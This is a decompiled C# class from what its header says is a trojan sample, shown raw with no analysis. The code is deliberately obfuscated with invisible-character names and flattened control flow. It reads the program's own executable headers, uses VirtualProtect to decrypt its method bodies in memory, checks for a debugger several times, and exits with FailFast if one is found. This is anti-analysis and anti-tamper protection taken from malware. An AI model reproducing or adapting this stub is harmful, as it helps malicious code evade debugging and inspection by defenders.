// Decompiled with JetBrains decompiler
// Type: M望太jjKI执生顾nh.官希PgNTqVMW的
// Assembly: hwP顾ER泽 kD, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C9D939F0-8B83-4933-BCEB-352D5DA3FC59
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\UDS-Trojan.Win32.GenericML.xnet-d826eceac956006d45cd749d13230ccac7c6ab2cd081cfd8084c8d3885365653.exe

using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;

namespace M望太jjKI执生顾nh
{
  internal class 官希PgNTqVMW的
  {
    static 官希PgNTqVMW的() => 官希PgNTqVMW的.\u206C‬‏‍‎⁯⁪‭‍‪‫‌‫⁭⁯‍⁪⁪‍‍‬⁭⁬‫‌⁪⁪‭‍‏‮​⁬‪‬‍⁭‫​⁫‮();

    [DllImport("kernel32.dll", EntryPoint = "VirtualProtect")]
    internal static extern bool \u206A‍‮‭‪‍‮‏‏‍​⁯⁫⁬⁭‌‌⁪⁬​‪‍‮⁯‬‬‍‫‬⁯‮‮‎‫‮‌⁫⁮⁮⁭‮(
      [In] IntPtr obj0,
      [In] uint obj1,
      [In] uint obj2,
      [In] ref uint obj3);

    [DllImport("kernel32.dll", EntryPoint = "CheckRemoteDebuggerPresent", SetLastError = true)]
    internal static extern bool \u206C‍⁪‌⁬‍⁯‎‬‮‪⁪⁭⁭‍‌⁭‪‏‏⁮⁫‌‮​‌‍⁭‎⁮⁪⁫⁯‭‍⁬‪⁯‫⁯‮(
      [In] IntPtr obj0,
      [In] ref bool obj1);

    internal static unsafe void \u206C‬‏‍‎⁯⁪‭‍‪‫‌‫⁭⁯‍⁪⁪‍‍‬⁭⁬‫‌⁪⁪‭‍‏‮​⁬‪‬‍⁭‫​⁫‮()
    {
      Module module = typeof (官希PgNTqVMW的).Module;
      string fullyQualifiedName = module.FullyQualifiedName;
      bool flag1 = fullyQualifiedName.Length > 0 && fullyQualifiedName[0] == '<';
      byte* hinstance = (byte*) (void*) Marshal.GetHINSTANCE(module);
      byte* numPtr1 = hinstance + *(uint*) (hinstance + 60);
      ushort num1 = *(ushort*) (numPtr1 + 6);
      ushort num2 = *(ushort*) (numPtr1 + 20);
      bool flag2 = false;
      uint* numPtr2 = (uint*) null;
      uint num3 = 0;
      uint* numPtr3 = (uint*) (numPtr1 + 24 + (int) num2);
      uint num4 = 1848626410;
      uint num5 = 3111531948;
label_1:
      int num6 = 1624675950;
      while (true)
      {
        uint num7;
        int index;
        uint num8;
        uint num9;
        uint[] numArray1;
        uint num10;
        uint num11;
        uint num12;
        uint num13;
        uint[] numArray2;
        int num14;
        uint num15;
        uint* numPtr4;
        uint num16;
        int num17;
        switch ((num7 = (uint) (num6 ^ 757247888)) % 55U)
        {
          case 0:
            numArray1[11] = numArray1[11] + numArray2[11];
            numArray1[12] = numArray1[12] ^ numArray2[12];
            numArray1[13] = numArray1[13] * numArray2[13];
            numArray1[14] = numArray1[14] + numArray2[14];
            num6 = (int) num7 * 1530129031 ^ -28667304;
            continue;
          case 1:
            numArray1[0] = numArray1[0] ^ numArray2[0];
            num6 = (int) num7 * -108681664 ^ 1709121680;
            continue;
          case 2:
            numArray1[6] = numArray1[6] ^ numArray2[6];
            num6 = (int) num7 * -1925756435 ^ -2008240994;
            continue;
          case 3:
            Environment.FailFast((string) null);
            num6 = (int) num7 * -950649849 ^ 635466890;
            continue;
          case 4:
            官希PgNTqVMW的.\u206C‍⁪‌⁬‍⁯‎‬‮‪⁪⁭⁭‍‌⁭‪‏‏⁮⁫‌‮​‌‍⁭‎⁮⁪⁫⁯‭‍⁬‪⁯‫⁯‮(Process.GetCurrentProcess().Handle, ref flag2);
            int num18 = !flag2 ? -1711580987 : (num18 = -1046663409);
            num6 = num18 ^ (int) num7 * -1048797007;
            continue;
          case 5:
            numPtr3 += 8;
            ++num14;
            num6 = 159534851;
            continue;
          case 6:
            ++num10;
            num6 = 969542099;
            continue;
          case 7:
            numPtr2 = (uint*) (hinstance + (flag1 ? numPtr3[3] : numPtr3[1]));
            官希PgNTqVMW的.\u206C‍⁪‌⁬‍⁯‎‬‮‪⁪⁭⁭‍‌⁭‪‏‏⁮⁫‌‮​‌‍⁭‎⁮⁪⁫⁯‭‍⁬‪⁯‫⁯‮(Process.GetCurrentProcess().Handle, ref flag2);
            num6 = 1813364218;
            continue;
          case 8:
            numArray1[9] = numArray1[9] ^ numArray2[9];
            numArray1[10] = numArray1[10] * numArray2[10];
            num6 = (int) num7 * 1058816525 ^ 1566191494;
            continue;
          case 9:
            if (flag1)
            {
              num17 = (int) numPtr3[2];
              break;
            }
            num6 = 274800759;
            continue;
          case 10:
            goto label_3;
          case 11:
            uint* numPtr5 = numPtr2;
            int num19 = (int) *numPtr5 ^ (int) numArray1[(int) num10 & 15];
            *numPtr5 = (uint) num19;
            num6 = 1367016355;
            continue;
          case 12:
            int num20;
            num6 = num20 = num11 >= num12 ? 433943330 : (num20 = 397355344);
            continue;
          case 13:
            numArray1[2] = numArray1[2] + numArray2[2];
            numArray1[3] = numArray1[3] ^ numArray2[3];
            numArray1[4] = numArray1[4] * numArray2[4];
            numArray1[5] = numArray1[5] + numArray2[5];
            num6 = (int) num7 * 1416868134 ^ -1082259345;
            continue;
          case 14:
            int num21 = num13 == 64U ? 1275783974 : (num21 = 586722166);
            num6 = num21 ^ (int) num7 * -1283659682;
            continue;
          case 15:
            goto label_1;
          case 16:
            num9 = num8 >> 7 | num8 << 25;
            num6 = 1238245882;
            continue;
          case 17:
            num17 = (int) *numPtr3;
            break;
          case 18:
            Environment.FailFast((string) null);
            num6 = (int) num7 * 1982675970 ^ 1582905140;
            continue;
          case 19:
            numArray1[15] = numArray1[15] ^ numArray2[15];
            num6 = (int) num7 * 384218781 ^ -643136023;
            continue;
          case 20:
            官希PgNTqVMW的.\u206A‍‮‭‪‍‮‏‏‍​⁯⁫⁬⁭‌‌⁪⁬​‪‍‮⁯‬‬‍‫‬⁯‮‮‎‫‮‌⁫⁮⁮⁭‮((IntPtr) (void*) numPtr2, num3 << 2, num13, ref num13);
            num6 = (int) num7 * -1675861971 ^ -1835160698;
            continue;
          case 21:
            goto label_22;
          case 22:
            num6 = (int) num7 * -1683923941 ^ 1595404101;
            continue;
          case 23:
            官希PgNTqVMW的.\u206C‍⁪‌⁬‍⁯‎‬‮‪⁪⁭⁭‍‌⁭‪‏‏⁮⁫‌‮​‌‍⁭‎⁮⁪⁫⁯‭‍⁬‪⁯‫⁯‮(Process.GetCurrentProcess().Handle, ref flag2);
            num6 = (int) num7 * 2066478615 ^ -1463530006;
            continue;
          case 24:
            index = 0;
            num6 = (int) num7 * -1250699756 ^ 117402271;
            continue;
          case 25:
            ++num15;
            num6 = (int) num7 * 400406788 ^ 1664602634;
            continue;
          case 26:
            int num22;
            num6 = num22 = num16 != 0U ? 507455921 : (num22 = 433943330);
            continue;
          case 27:
            numPtr4 = (uint*) (hinstance + (flag1 ? numPtr3[3] : numPtr3[1]));
            num12 = numPtr3[2] >> 2;
            num6 = 1559690116;
            continue;
          case 28:
            Environment.FailFast((string) null);
            num6 = (int) num7 * 4197866 ^ 2046328556;
            continue;
          case 29:
            numArray1[index] = num8;
            numArray2[index] = num5;
            num6 = 781693793;
            continue;
          case 30:
            int num23 = ((int) num4 ^ (int) *numPtr4++) + (int) num5 + (int) num9 * (int) num8;
            num4 = num5;
            num5 = num8;
            num8 = (uint) num23;
            ++num11;
            num6 = 415533550;
            continue;
          case 31:
            numArray2 = new uint[16];
            num6 = (int) num7 * 1024843853 ^ 941190795;
            continue;
          case 32:
            Environment.FailFast((string) null);
            num6 = (int) num7 * 848123530 ^ -1078119532;
            continue;
          case 33:
            num4 = num5 >> 5 | num5 << 27;
            num5 = num9 >> 3 | num9 << 29;
            num6 = (int) num7 * 2104508013 ^ -853850964;
            continue;
          case 34:
            int num24 = !flag2 ? -1553637882 : (num24 = -1144230872);
            num6 = num24 ^ (int) num7 * 1391626763;
            continue;
          case 35:
            int num25;
            num6 = num25 = num15 >= num3 ? 1734484200 : (num25 = 374637788);
            continue;
          case 36:
            num13 = 64U;
            num6 = (int) num7 * -731046155 ^ 24209428;
            continue;
          case 37:
            num15 = 0U;
            num6 = (int) num7 * 1349503328 ^ -2026262906;
            continue;
          case 38:
            int num26 = num16 != 96922236U ? 1455120687 : (num26 = 42657901);
            num6 = num26 ^ (int) num7 * 1872648926;
            continue;
          case 39:
            num11 = 0U;
            num6 = (int) num7 * -24173633 ^ -1934331443;
            continue;
          case 40:
            num10 = 0U;
            num6 = 385277788;
            continue;
          case 41:
            numArray1[(int) num10 & 15] = (uint) (((int) numArray1[(int) num10 & 15] ^ (int) *numPtr2++) + 1035675673);
            num6 = (int) num7 * 1418916563 ^ 1879721036;
            continue;
          case 42:
            numArray1[1] = numArray1[1] * numArray2[1];
            num6 = (int) num7 * 1647238862 ^ 485338636;
            continue;
          case 43:
            num6 = (int) num7 * 1627531290 ^ -633374029;
            continue;
          case 44:
            int num27 = !flag2 ? -1822141702 : (num27 = -2059562453);
            num6 = num27 ^ (int) num7 * 2059690824;
            continue;
          case 45:
            num14 = 0;
            num6 = 10991528;
            continue;
          case 46:
            numArray1[7] = numArray1[7] * numArray2[7];
            num6 = (int) num7 * -804632878 ^ -515880925;
            continue;
          case 47:
            num9 = 2517016337U;
            num8 = 2266463075U;
            官希PgNTqVMW的.\u206C‍⁪‌⁬‍⁯‎‬‮‪⁪⁭⁭‍‌⁭‪‏‏⁮⁫‌‮​‌‍⁭‎⁮⁪⁫⁯‭‍⁬‪⁯‫⁯‮(Process.GetCurrentProcess().Handle, ref flag2);
            num6 = (int) num7 * 859702873 ^ 69772375;
            continue;
          case 48:
            numArray1[8] = numArray1[8] + numArray2[8];
            num6 = (int) num7 * 1893052554 ^ -1434771083;
            continue;
          case 49:
            numArray1 = new uint[16];
            num6 = (int) num7 * 1565417205 ^ -1634423660;
            continue;
          case 50:
            int num28 = !flag2 ? -1269339977 : (num28 = -850207893);
            num6 = num28 ^ (int) num7 * -738483454;
            continue;
          case 51:
            uint* numPtr6 = numPtr3;
            uint* numPtr7 = (uint*) ((IntPtr) numPtr6 + 4);
            int num29 = (int) *numPtr6;
            uint* numPtr8 = numPtr7;
            numPtr3 = (uint*) ((IntPtr) numPtr8 + 4);
            int num30 = (int) *numPtr8;
            num16 = (uint) (num29 * num30);
            num6 = 396029255;
            continue;
          case 52:
            int num31;
            num6 = num31 = num14 >= (int) num1 ? 1780115938 : (num31 = 306135726);
            continue;
          case 53:
            int num32;
            num6 = num32 = index >= 16 ? 204361144 : (num32 = 1042042049);
            continue;
          case 54:
            num8 = num4 >> 11 | num4 << 21;
            ++index;
            num6 = (int) num7 * 1784138961 ^ 409675345;
            continue;
          default:
            goto label_60;
        }
        num3 = (uint) num17 >> 2;
        num6 = 433943330;
      }
label_3:
      return;
label_22:
      return;
label_60:;
    }
  }
}
